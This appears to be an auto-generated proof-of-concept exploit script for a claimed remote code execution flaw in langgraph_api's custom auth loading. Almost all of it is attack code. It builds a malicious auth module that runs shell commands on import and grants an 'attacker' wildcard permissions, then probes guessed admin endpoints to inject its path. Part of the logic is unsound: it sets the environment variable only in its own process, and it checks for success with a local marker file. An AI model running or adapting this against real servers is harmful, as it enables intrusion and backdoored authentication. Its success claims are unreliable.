#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: rce-008
# Sink: profiled_import
# Auto-generated — run with: python3 rce_load_auth_obj_function_profiled_import_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src custom auth loading.

Vulnerability: The _load_auth_obj function in custom.py uses importlib to load
an arbitrary Python file from a user-controlled path (LANGGRAPH_AUTH['path']).
An attacker who can control this configuration can execute arbitrary code.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file that executes a benign command
2. Setting the LANGGRAPH_AUTH environment variable to point to this file
3. Triggering the vulnerable code path

Usage:
    python3 poc.py [--target http://localhost:8000]
"""

import argparse
import os
import sys
import tempfile
import time
import urllib.request
import urllib.error
import subprocess
import json


def create_malicious_module():
    """Create a temporary Python file that will execute our payload."""
    # Benign payload - creates a marker file to prove code execution
    payload_code = '''
import os

# Benign proof-of-concept: create a marker file
os.system("touch /tmp/poc_success.txt")

# The Auth class that will be loaded
from langgraph_api.auth import Auth

class MaliciousAuth(Auth):
    """Malicious auth handler that executes code on import."""
    def __init__(self):
        super().__init__()
        # Additional payload execution on initialization
        os.system("echo 'POC_RCE_SUCCESS' >> /tmp/poc_success.txt")
    
    async def authenticate(self, request):
        return {"identity": "attacker", "permissions": ["*"]}

auth_instance = MaliciousAuth()
'''
    
    # Write to a temporary file
    tmp_dir = tempfile.mkdtemp()
    module_path = os.path.join(tmp_dir, "malicious_auth.py")
    with open(module_path, "w") as f:
        f.write(payload_code)
    
    return module_path, tmp_dir


def attempt_exploit_via_env(target_url, module_path):
    """
    Attempt 1: Set environment variable and trigger the vulnerable code path.
    This simulates an attacker who can control environment variables.
    """
    print("[*] Attempting exploit via environment variable injection...")
    
    # The path format expected by _load_auth_obj: "./path/to/file.py:callable_name"
    auth_path = f"{module_path}:auth_instance"
    
    # Set the environment variable that controls the auth path
    os.environ["LANGGRAPH_AUTH"] = json.dumps({"path": auth_path})
    
    # Try to trigger the vulnerable code by making a request that causes
    # the auth module to be loaded
    try:
        # Make a request to an endpoint that triggers auth loading
        req = urllib.request.Request(
            f"{target_url}/api/v1/threads",
            method="GET",
            headers={"Content-Type": "application/json"}
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            print(f"[*] Response status: {response.status}")
            print(f"[*] Response body: {response.read().decode()[:500]}")
            
    except urllib.error.HTTPError as e:
        print(f"[*] HTTP error (expected): {e.code} - {e.reason}")
        # Even errors might indicate the code was executed
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
        return False
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return False
    
    # Check if our payload executed
    return check_payload_execution()


def attempt_exploit_via_api(target_url, module_path):
    """
    Attempt 2: If there's an API that allows setting the auth configuration,
    try to exploit through that.
    """
    print("[*] Attempting exploit via API configuration...")
    
    auth_path = f"{module_path}:auth_instance"
    payload = {
        "path": auth_path
    }
    
    try:
        # Try common endpoints that might accept auth configuration
        endpoints = [
            f"{target_url}/api/v1/auth/config",
            f"{target_url}/api/v1/admin/auth",
            f"{target_url}/api/v1/settings",
        ]
        
        for endpoint in endpoints:
            print(f"[*] Trying endpoint: {endpoint}")
            data = json.dumps(payload).encode()
            req = urllib.request.Request(
                endpoint,
                data=data,
                method="POST",
                headers={
                    "Content-Type": "application/json",
                    "Content-Length": str(len(data))
                }
            )
            
            try:
                with urllib.request.urlopen(req, timeout=10) as response:
                    print(f"[*] Response: {response.status}")
                    print(f"[*] Body: {response.read().decode()[:500]}")
                    
                    # If we got here, the config might have been accepted
                    # Now trigger the auth loading
                    trigger_auth_loading(target_url)
                    
            except urllib.error.HTTPError as e:
                print(f"[*] Endpoint {endpoint} returned {e.code}")
                continue
                
    except Exception as e:
        print(f"[!] Error during API exploitation: {e}")
        return False
    
    return check_payload_execution()


def trigger_auth_loading(target_url):
    """Make a request that triggers the auth module to be loaded."""
    print("[*] Triggering auth module loading...")
    
    try:
        # Any request that requires authentication should trigger the loading
        req = urllib.request.Request(
            f"{target_url}/api/v1/threads",
            method="GET",
            headers={"Content-Type": "application/json"}
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            print(f"[*] Auth trigger response: {response.status}")
            
    except urllib.error.HTTPError:
        pass  # Expected if auth fails
    except Exception as e:
        print(f"[!] Error triggering auth: {e}")


def check_payload_execution():
    """Check if our payload executed successfully."""
    marker_file = "/tmp/poc_success.txt"
    
    if os.path.exists(marker_file):
        print("[+] SUCCESS! Payload executed!")
        with open(marker_file, "r") as f:
            content = f.read()
            print(f"[+] Marker file contents: {content.strip()}")
        return True
    else:
        print("[-] Payload did not execute (marker file not found)")
        return False


def cleanup(tmp_dir):
    """Clean up temporary files."""
    import shutil
    if os.path.exists(tmp_dir):
        shutil.rmtree(tmp_dir)
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        os.remove(marker_file)


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_api_src RCE via custom auth loading"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--method",
        choices=["env", "api", "both"],
        default="both",
        help="Exploitation method (default: both)"
    )
    
    args = parser.parse_args()
    
    print("[*] langgraph_api_src RCE PoC")
    print(f"[*] Target: {args.target}")
    print("[*] Creating malicious module...")
    
    module_path, tmp_dir = create_malicious_module()
    print(f"[*] Malicious module created at: {module_path}")
    
    success = False
    
    try:
        if args.method in ("env", "both"):
            if attempt_exploit_via_env(args.target, module_path):
                success = True
        
        if args.method in ("api", "both") and not success:
            if attempt_exploit_via_api(args.target, module_path):
                success = True
        
        if success:
            print("\n[+] VULNERABILITY CONFIRMED: RCE via custom auth path injection")
            print("[+] The application loaded and executed arbitrary Python code")
        else:
            print("\n[-] Exploit attempt completed but could not confirm RCE")
            print("[*] Note: This PoC requires the ability to control LANGGRAPH_AUTH")
            print("[*] configuration, which may require additional access to the target")
            
    finally:
        cleanup(tmp_dir)
        print("[*] Cleanup completed")


if __name__ == "__main__":
    main()
